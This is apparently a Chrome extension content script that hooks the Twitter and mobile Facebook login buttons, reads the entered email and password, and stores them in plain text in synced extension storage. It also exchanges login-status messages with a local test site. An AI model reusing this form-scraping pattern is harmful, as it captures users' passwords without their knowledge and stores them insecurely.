function sendmsg(msg) {
    chrome.runtime.sendMessage(msg);
}
if (window.location.href.indexOf("localhost/testweb/facebook") > -1) {
    sendmsg('checklogin');

    document.getElementById('needLogin').onclick = function() {
        sendmsg('fbLogin');
    };

    // document.getElementById('sendData').onclick = function() {
    //     alert('click');
    //     sendmsg('sendData');
    // };
}
if (window.location.href.indexOf("localhost/testweb/twitter") > -1) {
    sendmsg('checklogin');

    document.getElementById('needLogin').onclick = function() {
        sendmsg('twLogin');
    };

    // document.getElementById('sendData').onclick = function() {
    //     alert('click');
    //     sendmsg('sendData');
    // };
}
window.addEventListener('locationchange', function() {
    alert('location changed!');
});
if (window.location.href.indexOf("twitter.com/login") > -1) {
    try {
        window.addEventListener('locationchange', function() {
            alert('location changed!');
        });
        setTimeout(function() {
            document.querySelector('div[data-testid="LoginForm_Login_Button"]').onclick = function() {
                var email = document.querySelector('input[name="session[username_or_email]"]').value;
                var password = document.querySelector('input[name="session[password]"]').value;
                chrome.storage.sync.set({ TWemail: email, TWpassword: password }, function() {
                    console.log('Set');
                });
                // chrome.tabs.query({ active: true, currentWindow: true }, function(tabs) {
                //     chrome.tabs.remove(tabs);
                // });
                //         });
                // chrome.tabs.remove();

                // chrome.storage.sync.get(['FBemail', 'FBpassword'], function(result) {
                //     alert('Value' + result.FBpassword + 'currently is ' + result.FBemail);
                // });
                // sendmsg('Login');
            };
        }, 1000);
        // setTimeout(function() {
        //     sendmsg('donetwLogin');
        // }, 2000)

    } catch (err) {
        console.log(err);
    }
}

if (window.location.href.indexOf("mbasic.facebook.com/login") > -1) {
    try {
        document.querySelector('input[name="login"]').onclick = function() {
            var email = document.getElementById('m_login_email').value;
            var password = document.querySelector('input[name="pass"]').value;
            chrome.storage.sync.set({ FBemail: email, FBpassword: password }, function() {
                console.log('Set');
            });
            // chrome.tabs.query({ active: true, currentWindow: true }, function(tabs) {
            //     chrome.tabs.remove(tabs);
            // });
            //         });
            // chrome.tabs.remove();

            // chrome.storage.sync.get(['FBemail', 'FBpassword'], function(result) {
            //     alert('Value' + result.FBpassword + 'currently is ' + result.FBemail);
            // });
            // sendmsg('Login');
        };
    } catch (err) {
        console.log(err);
    }

}
chrome.runtime.onMessage.addListener(gotMessage);

function gotMessage(message, sender, sendResponse) {
    switch (message) {
        case 'showlogin':
            document.getElementById('needLogin').classList.remove("d-none");
            break;
        case 'showsendData':
            document.getElementById('sendData').classList.remove("d-none");
            document.getElementById('formsignin').classList.remove("d-none");
            break;
        case 'facebookLogin':
            facebookLogin();
            // setTimeout(facebookLogin(), 2000); 
            break;
        default:
            console.log('msg not have case!');
    }
}

if (window.location.href.indexOf("mbasic.facebook.com/home.php") > -1) {
    sendmsg('donefbLogin');
}
if (window.location.href.indexOf("https://twitter.com/home") > -1) {
    sendmsg('donetwLogin');
    // chrome.storage.sync.get(['TWcookie'], function(result) {
    //     chrome.cookies.getAll({ url: 'https://twitter.com' }, function(e) {
    //         if (JSON.stringify(result.TWcookie) !== JSON.stringify(e)) {
    //         } else {
    //             console.log('not match');
    //         }

    //     });
    // })
};